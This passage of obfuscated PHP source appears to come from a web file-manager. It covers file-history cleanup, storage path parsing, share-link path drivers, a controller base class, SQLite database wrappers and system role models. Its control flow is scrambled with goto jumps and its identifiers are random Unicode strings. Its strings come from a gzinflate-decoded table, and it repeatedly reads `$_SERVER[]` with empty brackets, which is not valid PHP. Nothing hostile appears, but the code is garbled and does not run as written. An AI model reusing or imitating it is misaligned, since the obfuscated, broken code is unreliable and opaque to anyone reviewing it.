f薚: $e◂ԭ = IO::pathFather($DƸך); IO::remove($DƸך); self::clearEmptyFolder($e◂ԭ); goto B; Aɏ: $Aޔ¯ =& $_SERVER[]; self::log($Aޔ¯[1141] . $DƸך . $Aޔ¯[68] . count($cح), $Aޔ¯[718]); if ($cح) { return IO::setContent($DƸך, json_encode($cح)); } goto f薚; b䡚: } public static function clearEmptyFolder($dٓ) { goto Aĸ賽; Dɫ: $FԆ = IO::has($dٓ, !0); if ($FԆ[$e[203]] > 0 || $FԆ[$e[204]] > 0) { return; } IO::remove($dٓ); goto a·; Aĸ賽: $e =& $_SERVER[]; if (trim($dٓ, $e[8]) == trim(self::$_historyBase, $e[8])) { return; } $a = IO::pathFather($dٓ); goto Dɫ; a·: self::clearEmptyFolder($a); goto b; b: } private static function getBasePath() { goto dʇϧ; c鮫: return $DӅ; goto f݇; e: $DӅ = DATA_PATH . $E[1144] . rand_string(8) . $E[8]; $DӅ = IO::mkdir($DӅ); $DӅ = rtrim($DӅ, $E[8]) . $E[8]; goto Aڇ; dʇϧ: $E =& $_SERVER[]; $DӅ = Model($E[1142])->get($E[1143]); if ($DӅ) { if (!IO::exist($DӅ)) { IO::mkdir($DӅ); } if (get_path_this($DӅ) == $E[1128]) { $eڠ = $E[1144] . rand_string(8); @rename($DӅ, get_path_father($DӅ) . $E[8] . $eڠ); $DӅ = DATA_PATH . $eڠ . $E[8]; file_put_contents(DATA_PATH . $E[1145], $E[33]); Model($E[1142])->set($E[1143], $DӅ); } return $DӅ; } goto e; Aڇ: file_put_contents($DӅ . $E[1145], $E[33]); file_put_contents(DATA_PATH . $E[1145], $E[33]); Model($E[1142])->set($E[1143], $DӅ); goto c鮫; f݇: } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\122\x65\x63\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\106\x69\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\106\151\x6c\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\x70\122\157\157\x74\123\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\123\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\x68\x61\162\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\141\x72\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\x65\111\164\145\x6d\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\x6b\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\x72\122\x65\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\x65\x72\175"; public static function typeList() { $Bۉ =& $_SERVER[]; return array($Bۉ[1146] => self::KOD_SOURCE, $Bۉ[1147] => self::KOD_USER_RECYCLE, $Bۉ[1148] => self::KOD_USER_FAV, $Bۉ[1149] => self::KOD_USER_FILE_TAG, $Bۉ[1150] => self::KOD_USER_FILE_TYPE, $Bۉ[1151] => self::KOD_GROUP_ROOT_SELF, $Bۉ[1152] => self::KOD_USER_SHARE, $Bۉ[1153] => self::KOD_USER_SHARE_LINK, $Bۉ[1154] => self::KOD_USER_SHARE_TO_ME, $Bۉ[1155] => self::KOD_SHARE_ITEM, $Bۉ[1156] => self::KOD_SHARE_LINK, $Bۉ[1157] => self::KOD_SEARCH, $Bۉ[1158] => self::KOD_BLOCK, $Bۉ[1159] => self::KOD_IO, $Bۉ[1160] => self::KOD_USER_RECENT, $Bۉ[1161] => self::KOD_USER_DRIVER); } public static function parse($aԗ) { goto Cߋ; Cߋ: $AïՌ =& $_SERVER[]; $aԗ = self::clear($aԗ); $C̈́ = array_values(self::typeList()); goto a; d膖: $c܇ = array($AïՌ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $d[$AïՌ[1127]] = in_array($d[$AïՌ[29]], $c܇); return $d; goto E΋; a: preg_match($AïՌ[1162], $aԗ, $cڶ); $d = array($AïՌ[415] => !1, $AïՌ[1163] => !1, $AïՌ[412] => !1, $AïՌ[76] => $aԗ, $AïՌ[1072] => !1, $AïՌ[1071] => $AïՌ[33]); if (is_array($cڶ) && count($cڶ) == 5) { $B = $AïՌ[1164] . $cڶ[2] . $AïՌ[325]; if (in_array($B, $C̈́)) { $d[$AïՌ[1072]] = $cڶ[1]; $d[$AïՌ[29]] = $B; $d[$AïՌ[1165]] = substr($B, 1, -1); $d[$AïՌ[393]] = $cڶ[3]; } $d[$AïՌ[1071]] = $cڶ[4]; } goto d膖; E΋: } public static function isTruePath($A֐) { goto c; A魴ה: if (strpos($A֐, $eۃ[1131]) === 0) { return !0; } if (strpos($A֐, $eۃ[1166]) === 0) { return !0; } if (strpos($A֐, $eۃ[1167]) === 0) { return !0; } goto A쬤; c: $eۃ =& $_SERVER[]; if (substr($A֐, 0, 1) != $eۃ[1164]) { return !0; } if (strpos($A֐, $eۃ[401]) === 0) { return !0; } goto A魴ה; A쬤: if (strpos($A֐, $eۃ[1168]) === 0) { return !0; } return !1; goto E; E: } public static function clear($CȊ) { goto fѵ; fѵ: $cƷŐ =& $_SERVER[]; $CȊ = str_replace(array($cƷŐ[1045], $cƷŐ[229]), $cƷŐ[50], $CȊ); $CȊ = str_replace($cƷŐ[97], $cƷŐ[8], $CȊ); goto E; fʾĎ: return $CȊ; goto b; Dƞ: $CȊ = preg_replace($cƷŐ[1171], $cƷŐ[8], $CȊ); if ($CȊ == $cƷŐ[8]) { return $cƷŐ[8]; } $CȊ = rtrim($CȊ, $cƷŐ[8]); goto fʾĎ; E: $Eθ = $cƷŐ[1169]; if (substr($CȊ, 0, 3) == $cƷŐ[1170]) { $CȊ = substr($CȊ, 3); } while (strstr($CȊ, $Eθ)) { $CȊ = str_replace($Eθ, $cƷŐ[8], $CȊ); } goto Dƞ; b: } public static function sourceID($a) { $C =& $_SERVER[]; $dɲ = self::parse($a); if ($dɲ[$C[29]] !== self::KOD_SOURCE) { show_json(LNG($C[1172]), !1); } return $dɲ[$C[393]]; } public static function make($C) { if (!$C) { return !1; } return self::makePath(self::KOD_SOURCE, intval($C)); } public static function makeShare($c辏, $BƑ) { return self::makePath(self::KOD_SHARE_ITEM, $c辏, $BƑ); } public static function makeFileTypePath($B۝) { return self::makePath(self::KOD_USER_FILE_TYPE, $B۝); } public static function makeFileTagPath($c޻) { return self::makePath(self::KOD_USER_FILE_TAG, $c޻); } public static function makePath($eڗ, $e = '', $Bޘ = '') { $f毕۹ =& $_SERVER[]; $B³ = substr($eڗ, 1, -1); $cٵ = $f毕۹[1173] . $B³ . $f毕۹[1174] . $e . $f毕۹[1175]; $cٵ = $Bޘ ? $cٵ . $Bޘ . $f毕۹[8] : $cٵ; return $cٵ; } public static function hashPath($f, $A݋ = true) { goto fӊń; fӊń: $EҊ =& $_SERVER[]; $e = is_array($f) ? $f : IO::info($f); $Aޡ = _get($e, $EҊ[1176], $EҊ[33]); goto cȡ; D˭: return $Aޡ; goto A͕; cȡ: if (!$Aޡ && isset($e[$EҊ[395]])) { $e = IO::info(KodIO::make($e[$EҊ[395]])); $Aޡ = _get($e, $EҊ[1176], $EҊ[33]); } if (!$Aޡ && $A݋) { $eϮ = KodIO::parse($e[$EҊ[76]]); if (!$eϮ[$EҊ[29]]) { $Aޡ = IO::hashSimple($e[$EҊ[76]]); } } if (!$Aޡ) { $Aޡ = md5($e[$EҊ[76]] . $e[$EҊ[78]] . $e[$EҊ[84]]); } goto D˭; A͕: } public static function initSystemPath() { goto aЊފ; B: IOHistory::bindEvent(); goto bȗ; Cݧ: define($Aڐ[1179], self::systemPath($Aڐ[1180])); define($Aڐ[1181], self::systemPath($Aڐ[1182])); define($Aڐ[1183], self::systemPath($Aڐ[1184])); goto B; aЊފ: $Aڐ =& $_SERVER[]; if (defined($Aڐ[1177])) { return; } define($Aڐ[1177], self::systemPath($Aڐ[1178])); goto Cݧ; bȗ: } public static function systemPath($bь) { goto B; eͿ: if ($fݖ) { return $fݖ; } if ($bь == $eԃ[1178]) { $fݖ = self::make(Model($eԃ[796])->systemRootPathAdd($eԃ[505])); } else { $fݖ = self::systemPath($eԃ[1178]); $E = self::sourceID($fݖ); $fݖ = self::make(Model($eԃ[796])->mkdir($E, $bь)); } Model($eԃ[736])->set($B٧, $fݖ); goto e; e: return $fݖ; goto B햰ޕ; B: $eԃ =& $_SERVER[]; $B٧ = $eԃ[1185] . ucfirst($bь); $fݖ = Model($eԃ[736])->get($B٧); goto eͿ; B햰ޕ: } public static function systemFolder($C٠ǩ) { $EÎ = IO_PATH_SYSTEM_SOURCE . $C٠ǩ; $bȱ = Cache::get($EÎ); if (!$bȱ) { $aӥ؃ = IO::infoFull($EÎ); if (!$aӥ؃) { $bȱ = IO::mkdir($EÎ, REPEAT_SKIP); } else { $bȱ = $aӥ؃[$_SERVER[][76]]; } Cache::set($EÎ, $bȱ, 3600 * 10); } return $bȱ; } public static function defaultDriver() { return Model($_SERVER[][733])->defaultDriver(); } public static function defaultIO() { $b뭭 =& $_SERVER[]; $D = self::defaultDriver(); return $b뭭[1186] . $D[$b뭭[393]] . $b뭭[1175]; } public static function defaultDriverInit() { static $Cթ = false; if ($Cթ) { return $Cթ; } $Cթ = IO::init(self::defaultIO()); return $Cթ; } public static function fileTypeList() { $Aʏ =& $_SERVER[]; $dތ = $GLOBALS[$Aʏ[6]][$Aʏ[1187]]; foreach ($dތ as $CǄ => $eκ) { $e = $Aʏ[1188] . $CǄ; $Eυ호 = LNG($e); if ($e != $Eυ호) { $dތ[$CǄ][$Aʏ[28]] = $Eυ호; } } return $dތ; } public static function transferType($A, $Cԏ) { goto Bӄ; BȨ݉: return $c͎[1191]; goto BĆӌ; d䂇: if ($aɍ㬛[$c͎[29]] == $F[$c͎[29]] && $aɍ㬛[$c͎[1189]] == $F[$c͎[1189]]) { return $c͎[1190]; } if ($aɍ㬛[$c͎[29]] == $c͎[829] && $F[$c͎[29]] == $c͎[106]) { return $c͎[1101]; } if ($aɍ㬛[$c͎[29]] == $c͎[106] && $F[$c͎[29]] == $c͎[829]) { return $c͎[107]; } goto BȨ݉; Bӄ: $c͎ =& $_SERVER[]; $aɍ㬛 = self::driverType($A); $F = self::driverType($Cԏ); goto d䂇; BĆӌ: } public static function driverType($Fڗ) { goto F; FɌ: return array($Eܴ[29] => $Eܴ[829], $Eܴ[1189] => $Fڗ->pathDriver, $Eܴ[76] => $A틆); goto Fワ; F: $Eܴ =& $_SERVER[]; $A틆 = $Fڗ->path; $d뇖 = str_replace($Eܴ[1192], $Eܴ[33], strtolower($Fڗ->getType())); goto Fۄߍ; Fۄߍ: if ($d뇖 == $Eܴ[724] || $d뇖 == $Eܴ[1193] || $d뇖 == $Eܴ[1194]) { $Fڗ = self::defaultDriverInit(); } else { if ($d뇖 == $Eܴ[1108] || $d뇖 == $Eܴ[1195]) { $Fڗ = IO::init($Fڗ->pathParse[$Eܴ[1055]]); } } $d뇖 = str_replace($Eܴ[1192], $Eܴ[33], strtolower($Fڗ->getType())); if ($d뇖 == $Eܴ[106]) { return array($Eܴ[29] => $Eܴ[106], $Eܴ[1189] => $Eܴ[33], $Eܴ[76] => $A틆); } goto FɌ; Fワ: } } goto E; Cƨ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($FԿ) { $this->pathParse = $FԿ; $this->model = Model($_SERVER[][1213]); } protected function infoParse($b猝, $eૺń = false, $Eو鎶 = false) { $d򔖝 =& $_SERVER[]; return Action($d򔖝[1077])->sharePathInfo($this->pathParse[$d򔖝[76]], !0); } public function listPath($e, $Cф = false) { $bŤ =& $_SERVER[]; $A = parent::listPath($e, $Cф); foreach ($A as $dݕ => $bܸ) { if (!in_array($dݕ, array($bŤ[74], $bŤ[75]))) { continue; } foreach ($bܸ as $C => $aļɆ) { $A[$dݕ][$C] = Action($bŤ[1077])->shareItemInfo($aļɆ); } } return $A; } public function listAll($a) { goto eَ; d: return $a٢ʂ; goto c; eَ: $Cۡ𩧹 =& $_SERVER[]; $fУ = IO::info($this->pathParse[$Cۡ𩧹[76]]); if (!$fУ) { return array(); } goto eҘ; eҘ: $a٢ʂ = $this->model->listAll($a); foreach ($a٢ʂ as &$Eߑ) { $Eߑ[$Cۡ𩧹[85]] = Action($Cۡ𩧹[1077])->shareItemInfo($Eߑ[$Cۡ𩧹[85]]); } unset($Eߑ); goto d; c: } } class PathDriverDriverShareItem { public function __construct($cхӑ) { $this->pathParse = $cхӑ; } public function __call($cŢǉ, $Aׂ) { $D =& $_SERVER[]; if (method_exists($this, $cŢǉ)) { return; } $f󙜚 = call_user_func_array(array($D[1222], $cŢǉ), $Aׂ); $a = array($D[1223], $D[1224], $D[1225], $D[1226], $D[518], $D[520], $D[1227], $D[107], $D[1228], $D[1229]); if (in_array($cŢǉ, $a)) { $f󙜚 = $this->getPathOuter($f󙜚); } return $f󙜚; } public function copy($eˑ, $EĖ, $C٧͛ = false) { return $this->copyMove($eˑ, $EĖ, $C٧͛, $_SERVER[][518]); } public function move($Eė, $Cщ, $E = false) { return $this->copyMove($Eė, $Cщ, $E, $_SERVER[][520]); } private function copyMove($eԝ, $Dϥ, $dΟ, $C²ب) { goto Cƌ; Cƌ: $eݩ =& $_SERVER[]; $cՌ߭ = $Dϥ; $cɋ = IO::driverMake($Dϥ); goto a͚; a͚: if ($cɋ->pathParse[$eݩ[1055]]) { $Dϥ = $cɋ->pathParse[$eݩ[1055]]; } else { $Dϥ = $cՌ߭; } $Aҝ = IO::copyMove($eԝ, $Dϥ, $dΟ, $C²ب); $Aҝ = $this->getPathOuter($Aҝ); goto a젺; a젺: return $Aҝ; goto a; a: } public function pathThis($bۜ) { return get_path_this($this->pathParse[$_SERVER[][76]]); } public function pathFather($bו) { return get_path_father($this->pathParse[$_SERVER[][76]]); } public function iconvSystem($FƉ) { return $FƉ; } protected function infoParse($d̋, $E = false) { $A =& $_SERVER[]; $f = $this->pathParse[$A[466]][$A[1078]] . $this->pathParse[$A[1071]]; if ($E) { $d = IO::infoWithChildren($f); } else { $d = IO::info($f); } $Fֱ = $this->pathParse[$A[466]]; return Action($A[1221])->_shareItemeParse($d, $Fֱ); } public function listAll($e햗) { $f =& $_SERVER[]; $a샏 = IO::listAll($e햗); $a傛 = $this->pathParse[$f[466]]; foreach ($a샏 as &$EΒ) { check_abort(); $Bݻȗ = IO::info($EΒ[$f[76]]); $Bݻȗ = is_array($Bݻȗ) ? $Bݻȗ : array(); $EΒ = array_merge($Bݻȗ, $EΒ); $EΒ[$f[85]] = Action($f[1221])->_shareItemeParse($EΒ, $a傛); } unset($EΒ); return $a샏; } public function getPathOuter($D͂) { goto b΃і; b͒կ: if (substr($d̑߫, 0, strlen($Aē)) != $Aē) { return !1; } return $this->pathParse[$Bѷ[1072]] . $Bѷ[8] . ltrim($Eǭ, $Bѷ[8]); goto eٴ; b΃і: $Bѷ =& $_SERVER[]; $bɠ = KodIO::parse($D͂); if ($bɠ[$Bѷ[29]] == KodIO::KOD_SHARE_ITEM) { return $bɠ[$Bѷ[76]]; } goto c龈; c龈: $d̑߫ = KodIO::clear($D͂); $Aē = KodIO::clear($this->pathParse[$Bѷ[466]][$Bѷ[1078]]); $Eǭ = substr($d̑߫, strlen($Aē)); goto b͒կ; eٴ: } public function getType() { $DȂ̭ =& $_SERVER[]; $D = str_replace($DȂ̭[72], $DȂ̭[33], get_class($this)); return strtolower($D); } public function isTypeObject($b؅) { return IO::isTypeObject($b؅); } public function info($A԰) { return $this->infoParse($A԰); } public function infoAuth($dЫ) { return $this->infoParse($dЫ); } public function infoWithChildren($dՇ) { return $this->infoParse($dՇ, !0); } public function infoFull($d) { return $this->infoParse($d); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F²) { $this->pathParse = $F²; } protected function infoParse($D, $aïܐמ = false) { $c =& $_SERVER[]; return Action($c[1077])->sharePathInfo($this->pathParse[$c[76]], !0, $aïܐמ); } public function listPath($F, $Cߴ = false) { $bƧ =& $_SERVER[]; $b溦Ƕ = IO::listPath($F, $Cߴ); foreach ($b溦Ƕ as $dېݹ => $Cמ) { if (!in_array($dېݹ, array($bƧ[74], $bƧ[75]))) { continue; } foreach ($Cמ as $Fň => $b֥䢥) { $b֥䢥 = Action($bƧ[1230])->parsePathChildren($b֥䢥, array($bƧ[414] => $F)); $b溦Ƕ[$dېݹ][$Fň] = Action($bƧ[1077])->shareItemInfo($b֥䢥); } } return $b溦Ƕ; } public function listAll($Fʇì) { $Bԯ =& $_SERVER[]; $d = IO::listAll($Fʇì); foreach ($d as &$B) { $E⯌ = IO::info($B[$Bԯ[76]]); $E⯌ = is_array($E⯌) ? $E⯌ : array(); $B = array_merge($E⯌, $B); $B[$Bԯ[85]] = Action($Bԯ[1077])->shareItemInfo($B); } unset($B); return $d; } } goto cߌՐ; Aˣ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto c; c: $bҜ =& $_SERVER[]; global $in, $config; $this->config =& $config; goto Cǋօ; Cǋօ: $this->in =& $in; $this->values[$bҜ[6]] =& $config; $this->values[$bҜ[7]] =& $in; goto E; E: $this->tpl = TEMPLATE . MOD . $bҜ[8]; $this->_classObjectID = mt_rand(0, 10000); goto Cà; Cà: } public function loadClass($c脙) { if (1 === func_num_args()) { $this->{$c脙} = new $c脙(); } else { $b̏殺 = new ReflectionClass($c脙); $aԉ = func_get_args(); array_shift($aԉ); $this->{$c脙} = $b̏殺->newInstanceArgs($aԉ); } return $this->{$c脙}; } protected function assign($e񘳶, $a݌) { $this->values[$e񘳶] = $a݌; } protected function display($cҲ) { ob_end_clean(); extract($this->values); require $this->tpl . $cҲ; } } class DbSqliteBase extends Db { public function __construct($eܦ = '') { $a掉 =& $_SERVER[]; if (!extension_loaded($a掉[9])) { think_exception(think_lang($a掉[10]) . $a掉[11]); } if (!empty($eܦ)) { if (!isset($eܦ[$a掉[12]])) { $eܦ[$a掉[12]] = 438; } $this->config = $eܦ; if (empty($this->config[$a掉[13]])) { $this->config[$a掉[13]] = array(); } } } public function connect($Fɯ = '', $eȈ = 0) { $E =& $_SERVER[]; if (!isset($this->linkID[$eȈ])) { goto Aӑ; E֠: $this->linkID[$eȈ] = $eܵ($Fɯ[$E[17]], $Fɯ[$E[12]]); if (!$this->linkID[$eȈ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto D܏; Aӑ: if (empty($Fɯ)) { $Fɯ = $this->config; } $eƗ = !empty($Fɯ[$E[13]][$E[14]]) ? $Fɯ[$E[13]][$E[14]] : $this->pconnect; $eܵ = $eƗ ? $E[15] : $E[16]; goto E֠; D܏: @sqlite_busy_timeout($this->linkID[$eȈ], 30000); if (1 != think_config($E[18])) { unset($this->config); } goto a; a: } return $this->linkID[$eȈ]; } public function free() { $this->queryID = null; } public function query($Bʣ) { goto Bݎ; a󽼤: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Dн = $this->getAll(); return $Dн; } goto A; Cߩ: think_status($Cɹ[20]); $this->queryID = sqlite_query($this->_linkID, $Bʣ); $this->debug(); goto a󽼤; Bݎ: $Cɹ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C屫ɂ; C屫ɂ: $this->queryStr = $Bʣ; if ($this->queryID) { $this->free(); } think_action_status($Cɹ[19], 1); goto Cߩ; A: } public function execute($aׅഢ) { goto B; Fτ: $this->queryStr = $aׅഢ; if ($this->queryID) { $this->free(); } think_action_status($Cθ坷[21], 1); goto Dת; B: $Cθ坷 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fτ; A: if (!1 === $dɴ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto cć; Dת: think_status($Cθ坷[20]); $dɴ = sqlite_exec($this->_linkID, $aׅഢ); $this->debug(); goto A; cć: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aʌǄ = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$aʌǄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C̪鹄 = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$C̪鹄) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f뱸 = array(); if ($this->numRows > 0) { for ($c = 0; $c < $this->numRows; $c++) { $f뱸[$c] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $f뱸; } public function getFields($B) { $b߽֡ =& $_SERVER[]; $Cԧ = $this->query($b߽֡[25] . $B . $b߽֡[26]); $c = array(); if ($Cԧ) { foreach ($Cԧ as $c => $Fϡ) { $c[$Fϡ[$b߽֡[27]]] = array($b߽֡[28] => $Fϡ[$b߽֡[27]], $b߽֡[29] => $Fϡ[$b߽֡[30]], $b߽֡[31] => (bool) ($Fϡ[$b߽֡[32]] === $b߽֡[33]), $b߽֡[34] => $Fϡ[$b߽֡[35]], $b߽֡[36] => strtolower($Fϡ[$b߽֡[37]]) == $b߽֡[38], $b߽֡[39] => strtolower($Fϡ[$b߽֡[40]]) == $b߽֡[41]); } } return $c; } public function getTables($Fݎ⮜ = '') { $D =& $_SERVER[]; $b̵ = $this->query($D[42] . $D[43] . $D[44]); $fʊЧ = array(); foreach ($b̵ as $A؝ => $Aظ) { $fʊЧ[$A؝] = current($Aظ); } return $fʊЧ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $C致 =& $_SERVER[]; $aه = sqlite_last_error($this->_linkID); $this->error = $aه . $C致[4] . sqlite_error_string($aه); if ($C致[33] != $this->queryStr) { $this->error .= LNG($C致[45]) . $this->queryStr; } think_trace($this->error, $C致[33], $C致[46]); return $this->error; } public function escapeString($dвΡڂ) { return sqlite_escape_string($dвΡڂ); } public function parseLimit($a) { $FЅɬ =& $_SERVER[]; $F = $FЅɬ[33]; if (!empty($a)) { $a = explode($FЅɬ[47], $a); if (count($a) > 1) { $F .= $FЅɬ[48] . $a[1] . $FЅɬ[49] . $a[0] . $FЅɬ[50]; } else { $F .= $FЅɬ[48] . $a[0] . $FЅɬ[50]; } } return $F; } } class DbSqlite3Base extends Db { public function __construct($Fǟʽ = '') { $eҋǏ =& $_SERVER[]; if (!class_exists($eҋǏ[51])) { think_exception(think_lang($eҋǏ[10]) . $eҋǏ[52]); } if (!empty($Fǟʽ)) { if (!isset($Fǟʽ[$eҋǏ[12]])) { $Fǟʽ[$eҋǏ[12]] = 438; } $this->config = $Fǟʽ; if (empty($this->config[$eҋǏ[13]])) { $this->config[$eҋǏ[13]] = array(); } } } public function connect($B = '', $cҍ = 0) { $D݄ =& $_SERVER[]; if (!isset($this->linkID[$cҍ])) { if (empty($B)) { $B = $this->config; } $this->linkID[$cҍ] = new SQLite3($B[$D݄[17]]); if (!$this->linkID[$cҍ]) { think_exception($this->linkID[$cҍ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$cҍ]->busyTimeout(30000); if (1 != think_config($D݄[18])) { unset($this->config); } } return $this->linkID[$cҍ]; } public function free() { $this->queryID = null; } public function query($CԞ) { goto E܂; F: if (!1 === $this->queryID) { $this->error(); return !1; } else { $B͒ = $this->getAll(); $this->numRows = count($B͒); return $B͒; } goto f̝; B: think_status($bޕփ[20]); $this->queryID = $this->_linkID->query($CԞ); $this->debug(); goto F; e·: $this->queryStr = $CԞ; if ($this->queryID) { $this->free(); } think_action_status($bޕփ[19], 1); goto B; E܂: $bޕփ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e·; f̝: } public function execute($c) { goto bڪ; a: if (!1 === $E߰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DҾ; cϼ: think_status($a៥[20]); $E߰ = $this->_linkID->exec($c); $this->debug(); goto a; cݟћҗ: $this->queryStr = $c; if ($this->queryID) { $this->free(); } think_action_status($a៥[21], 1); goto cϼ; bڪ: $a៥ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cݟћҗ; DҾ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D = $this->_linkID->query($_SERVER[][23]); if (!$D) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cթ = $this->_linkID->query($_SERVER[][24]); if (!$cթ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D˙ = array(); while ($a빤 = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D˙[] = $a빤; } $this->queryID->reset(); return $D˙; } public function getFields($E) { $A =& $_SERVER[]; $b = $this->query($A[25] . $E . $A[26]); $Bڿ޼ = array(); if ($b) { foreach ($b as $C => $E߈) { $Bڿ޼[$E߈[$A[28]]] = array($A[28] => $E߈[$A[28]], $A[29] => $E߈[$A[29]], $A[31] => (bool) ($E߈[$A[31]] === $A[33]), $A[34] => $E߈[$A[53]], $A[36] => (bool) $E߈[$A[54]], $A[39] => (bool) $E߈[$A[54]]); } } return $Bڿ޼; } public function getTables($a܋ = '') { $a =& $_SERVER[]; $aĉˆ = $this->query($a[42] . $a[43] . $a[44]); $b㈟ = array(); foreach ($aĉˆ as $AΕ => $f) { $b㈟[$AΕ] = current($f); } return $b㈟; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $AɏѦ =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($AɏѦ[33] != $this->queryStr) { $this->error .= LNG($AɏѦ[45]) . $this->queryStr; } think_trace($this->error, $AɏѦ[33], $AɏѦ[46]); return $this->error; } public function escapeString($EϜ) { $dӔ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($EϜ); } return str_ireplace($dӔ[55], $dӔ[56], $EϜ); } public function parseLimit($F) { $Dۜ =& $_SERVER[]; $E = $Dۜ[33]; if (!empty($F)) { $F = explode($Dۜ[47], $F); if (count($F) > 1) { $E .= $Dۜ[48] . $F[1] . $Dۜ[49] . $F[0] . $Dۜ[50]; } else { $E .= $Dۜ[48] . $F[0] . $Dۜ[50]; } } return $E; } } goto Fۈ; Cд: $B = $_SERVER[][574]; $_SERVER[] = explode($_SERVER[][575], gzinflate(substr($_SERVER[][576], 10, -8))); $fĝێ = $_SERVER[][577]; goto Aș; A: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\x6d\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\155\x65\x6e\x75", "\162\x6f\x6c\x65", "\x72\x6f\x6c\145\107\x72\x6f\x75\x70", "\x72\x65\x67\151\x73\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($cǧ) { return "\123\x79\x73\x74\145\x6d\x4f\160\x74\151\157\156\x5f{$cǧ}"; } protected function optionDefault($A縸Ϟ = '') { $C =& $_SERVER[]; if ($A縸Ϟ == $C[33]) { return $GLOBALS[$C[6]][$C[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\162\x6f\154\145\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x61\x75\x74\150", "\x6c\141\x62\145\x6c", "\x64\x69\x73\160\154\141\171", "\x73\x79\x73\164\x65\x6d", "\144\x65\x73\x63", "\x69\147\x6e\157\x72\x65\105\170\164", "\x69\x67\156\157\162\x65\x46\x69\x6c\x65\123\151\x7a\145", "\141\144\155\x69\x6e\151\163\164\x72\141\x74\157\x72", "\163\157\x72\164"); public function listData($f̪ = false, $Bږ = "\163\157\162\164", $B = false) { $D񝯧Г =& $_SERVER[]; $f = parent::listData($f̪, $Bږ, $B); if (!$f̪) { foreach ($f as $Fں => $bؘ⦍) { if ($bؘ⦍[$D񝯧Г[1890]] == 1) { $f[$Fں][$D񝯧Г[431]] = LNG($D񝯧Г[2116]); } } } return $f; } public function update($eׄ, $B) { goto d䐴Ɵ͢; E뫕: if (!$D٨ || $Fɕ && $Fɕ[$B҇ם[393]] != $D٨[$B҇ם[393]]) { return !1; } if ($Fɕ[$B҇ם[1890]] == 1) { $B = array($B҇ם[28] => $B[$B҇ם[28]], $B҇ם[1722] => $B[$B҇ם[1722]]); } $this->filterAuth($B[$B҇ם[406]]); goto b؝; b؝: return parent::update($eׄ, $B); goto a; d䐴Ɵ͢: $B҇ם =& $_SERVER[]; $D٨ = parent::listData($eׄ); $Fɕ = $this->findByName($B[$B҇ם[28]]); goto E뫕; a: } public function remove($FÖ) { $D = parent::listData($FÖ); if (!$D || $D[$_SERVER[][1178]]) { return !1; } return parent::remove($FÖ); } public function add($aʂд˰) { goto c匦ڡ; d❋: $Bզ = array($FЍ[413] => 